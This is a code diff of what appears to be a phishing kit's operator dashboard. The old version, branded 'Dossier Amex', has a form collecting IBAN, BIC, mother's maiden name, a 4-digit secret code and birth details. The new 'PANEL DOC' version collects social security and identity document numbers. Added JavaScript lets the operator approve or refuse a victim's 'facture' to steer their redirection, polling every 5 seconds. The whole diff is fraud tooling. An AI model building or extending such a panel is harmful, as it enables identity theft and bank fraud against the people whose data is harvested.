@@ -449,19 +449,94 @@
 .btn-delete:hover {
     background: #c82333;
 }
+
+/* Logo PANEL DOC */
+.logo-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 35px 20px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+    margin-bottom: 30px;
+    position: relative;
+    overflow: hidden;
+}
+
+.logo-container::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle at 50% 50%, rgba(0, 111, 207, 0.35), transparent 70%);
+    animation: pulseGlow 3s ease-in-out infinite;
+}
+
+@keyframes pulseGlow {
+    0%, 100% { opacity: 0.4; }
+    50% { opacity: 1; }
+}
+
+.logo-panel {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 1.6rem;
+    font-weight: 800;
+    letter-spacing: 2px;
+    color: #fff;
+    position: relative;
+    z-index: 1;
+    text-transform: uppercase;
+    animation: logoFloat 4s ease-in-out infinite;
+}
+
+@keyframes logoFloat {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-4px); }
+}
+
+.logo-panel i {
+    font-size: 2rem;
+    background: linear-gradient(135deg, #4DBDC6, #006FCF);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    filter: drop-shadow(0 0 10px rgba(77, 189, 198, 0.8));
+}
+
+.logo-panel span {
+    background: linear-gradient(90deg, #ffffff, #4DBDC6, #006FCF, #ffffff);
+    background-size: 300% 100%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: shineText 5s linear infinite;
+}
+
+.logo-panel strong {
+    font-weight: 900;
+    -webkit-text-fill-color: #4DBDC6;
+}
+
+@keyframes shineText {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 300% 50%; }
+}
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="sidebar">
         <div class="logo-container">
-            <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express">
+  <div class="logo-panel">
+    <i class="fas fa-shield-halved"></i>
+    <span>PANEL <strong>DOC</strong></span>
+</div>
         </div>
         <div class="nav-menu">
             <div class="nav-item">
                 <a href="#" class="nav-link active" data-rubrique="dossier">
                     <i class="fas fa-folder-open"></i>
-                    <span>Dossier Amex</span>
+                    <span>Dashboard</span>
                 </a>
             </div>
             <div class="nav-item">
@@ -481,11 +556,11 @@
 
     <div class="main-content">
         <div class="top-header">
-            <h1 class="page-title" id="mainTitle">Dossier Amex</h1>
+            <h1 class="page-title" id="mainTitle">Dashboard</h1>
             <div class="admin-info">
                 <div class="admin-name">
-                    <div>£$IM ADMIN</div>
-                    <small style="color: #6c757d;">Administrateur</small>
+                    <div>Black Mamba</div>
+
                 </div>
             </div>
         </div>
@@ -505,11 +580,11 @@
             </div>
         </div>
 
-        <!-- Rubrique Dossier Amex -->
+        <!-- Rubrique Dashboard -->
         <div id="dossierContent" class="rubrique-container rubrique-content active">
             <div class="rubrique-title">
                 <i class="fas fa-folder-open" style="margin-right: 10px; color: #006FCF;"></i>
-                Gestion des Dossiers Amex
+                Gestion des Pack ID
             </div>
             <div class="search-bar">
     <div class="search-bar-wrapper">
@@ -524,9 +599,8 @@
                     <thead>
                         <tr>
                             <th>ID Dossier</th>
-                            <th>Client</th>
-                            <th>Email</th>
-                            <th>Statut</th>
+                            <th>Nom</th>
+                            <th>Prénom</th>
                             <th>Date création</th>
                             <th>Action</th>
                         </tr>
@@ -551,9 +625,9 @@
                 <table id="docTable">
                     <thead>
                         <tr>
+                            <th>ID Client</th>
                             <th>ID Document</th>
                             <th>Type</th>
-							<th>Propriétaire</th>
                             <th>Date dépôt</th>
                             <th>Statut vérif</th>
                             <th>Action</th>
@@ -595,12 +669,6 @@
 <div id="dossierModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h2>📁 LIEN DOSSIER AMEX</h2>
-            <div class="amex-link">
-                🔗 <a href="https://www.americanexpress.com/fr-fr/charge-cards/apply/personal/platinum?intlink=fr-amex-cardshop-details-apply-CartePlatinumAmericanExpress-siderail" target="_blank">https://www.americanexpress.com/fr-fr/charge-cards/apply/personal/platinum</a>
-            </div>
-        </div>
-
         <form id="dossierForm">
             <div class="form-row">
                 <div class="form-group">
@@ -618,105 +686,21 @@
                 <input type="date" id="dateNaissance" required>
             </div>
 
-            <div class="form-group">
-                <label>Email *</label>
-                <input type="email" id="email" required>
-            </div>
+                <div class="form-group">
+                    <label>Sécurité sociale *</label>
+                    <input type="text" id="NumeroSecuriteSociale" required>
+                </div>
+            
 
-            <div class="form-group">
-                <label>Numéro de téléphone *</label>
-                <input type="tel" id="telephone" required>
-            </div>
-
-            <div class="form-group">
-                <label>Ville de naissance *</label>
-                <input type="text" id="villeNaissance" required>
-            </div>
-
-            <div class="form-group">
-                <label>Département de naissance *</label>
-                <input type="text" id="departementNaissance" required>
-            </div>
-
-            <div class="form-group">
-                <label>Adresse de livraison *</label>
-                <input type="text" id="adresseLivraison" required>
-            </div>
-
-            <div class="form-row">
-    <div class="form-group">
-        <label>IBAN *</label>
-        <input type="text" id="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required>
-    </div>
-    <div class="form-group">
-        <label>BIC *</label>
-        <input type="text" id="bic" placeholder="Exemple: BNPAFRPP" required>
-    </div>
-</div>
-
-            <div class="form-group">
-    <label>Montant annuel * (en €)</label>
-    <input type="number" id="montantAnnuel" placeholder="Exemple: 125000" required>
-</div>
-
-            <div class="form-group">
-                <label>Catégorie</label>
-                <input type="text" id="categorie" value="Cadres et professions intellectuelle supérieures" readonly>
-            </div>
-
-            <div class="form-group">
-                <label>Profession</label>
-                <input type="text" id="profession" value="Cadre administratif" readonly>
-            </div>
-
-            <div class="form-group">
-                <label>Secteur *</label>
-                <select id="secteur" required>
-                    <option value="">-- Sélectionnez --</option>
-                    <option value="Activités financières et d'assurance">Activités financières et d'assurance</option>
-                    <option value="Industrie manufacturière">Industrie manufacturière</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="boulotGroup">
-    <label>Boulot *</label>
-    <select id="boulot">
-    <option value="">-- Sélectionnez --</option>
-    <option value="Allianz">Allianz</option>
-    <option value="AXA">AXA</option>
-    <option value="Natixis Investment Managers">Natixis Investment Managers</option>
-    <option value="Michelin">Michelin</option>
-    <option value="Philips">Philips</option>
-    <option value="Dyson">Dyson</option>
-    <option value="Sony">Sony</option>
-</select>
-</div>
-
-            <div class="form-group">
-    <label>Ancienneté professionnelle *</label>
-    <select id="anciennete" required>
-        <option value="">-- Sélectionnez --</option>
-        <option value="5 ans">5 ans</option>
-        <option value="6 ans">6 ans</option>
-        <option value="7 ans">7 ans</option>
-        <option value="8 ans">8 ans</option>
-        <option value="9 ans">9 ans</option>
-    </select>
-</div>
-
-            <div class="form-group">
-                <label>Nom de jeune fille de la mère *</label>
-                <input type="text" id="nomJeuneFille" required>
-            </div>
-
-            <div class="form-group">
-                <label>Code à 4 chiffres *</label>
-                <input type="password" id="codeSecret" maxlength="4" pattern="[0-9]{4}" required>
+                <div class="form-group">
+                    <label>Document identité *</label>
+                    <input type="text" id="NumeroDocument" required>
+                </div>
             </div>
 
             <div class="modal-footer">
                 <button type="button" class="btn-cancel" onclick="fermerModal()">Annuler</button>
-                <button type="submit" class="btn-save">Enregistrer le dossier Amex</button>
+                <button type="submit" class="btn-save">Enregistrer le Pack ID</button>
             </div>
         </form>
     </div>
@@ -751,12 +735,40 @@ function afficherRedirections(redirections) {
             <td><strong>${r.clientId}</strong></td>
             <td>${r.sourceUrl}</td>
             <td>${r.destinationUrl || '-'}</td>
-            <td><span class="badge ${r.status === 'en_attente' ? 'badge-warning' : 'badge-success'}">${r.status === 'en_attente' ? 'En attente' : 'Redirigé'}</span></td>
+            <td><span class="badge ${r.status === 'en_attente' ? 'badge-warning' : (r.status === 'redirige' ? 'badge-success' : 'badge-danger')}">${r.status === 'en_attente' ? 'En attente' : (r.status === 'redirige' ? 'Redirigé' : 'Refusé')}</span></td>
             <td>
-                <button class="btn-action" onclick="validerRedirection('${r.clientId}')" ${r.status !== 'en_attente' ? 'disabled' : ''}>Valider</button>
+                ${r.type === 'facture' ? `
+                    <button class="btn-action" style="background:#28a745;" onclick="actionRedirection('${r.clientId}', 'valid')" ${r.status !== 'en_attente' ? 'disabled' : ''}>Valid Facture</button>
+                    <button class="btn-delete" onclick="actionRedirection('${r.clientId}', 'refus')" ${r.status !== 'en_attente' ? 'disabled' : ''}>Refus Facture</button>
+                ` : `
+                    <button class="btn-action" onclick="validerRedirection('${r.clientId}')" ${r.status !== 'en_attente' ? 'disabled' : ''}>Valider</button>
+                `}
             </td>
         </tr>
     `).join('');
+}
+
+// Nouvelle fonction pour Valid/Refus Facture
+async function actionRedirection(clientId, action) {
+    try {
+        const response = await fetch('backend-amex/action-redirection.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ clientId: clientId, action: action })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            alert(action === 'valid' ? 'Facture validée. L\'utilisateur va être redirigé.' : 'Facture refusée. La page va être rechargée.');
+            chargerRedirections();
+        } else {
+            alert('Erreur: ' + result.error);
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion');
+    }
 }
 
 async function validerRedirection(clientId) {
@@ -1174,7 +1186,7 @@ function fermerVoirModal() {
                 
                 if (rubrique === 'dossier') {
                     document.getElementById('dossierContent').classList.add('active');
-                    document.getElementById('mainTitle').innerText = 'Dossier Amex';
+                    document.getElementById('mainTitle').innerText = 'Dashboard';
                 } else if (rubrique === 'vicdoc') {
                     document.getElementById('vicdocContent').classList.add('active');
                     document.getElementById('mainTitle').innerText = 'VIC/DOC';
@@ -1198,7 +1210,8 @@ function fermerVoirModal() {
 chargerDossiers();
 chargerDocumentsCNI();
 afficherDocuments();
-chargerRedirections();
+// Rafraîchir automatiquement toutes les 5 secondes
+setInterval(chargerRedirections, 5000);
 
         // Gestion de la modale
 function creerDossier() {
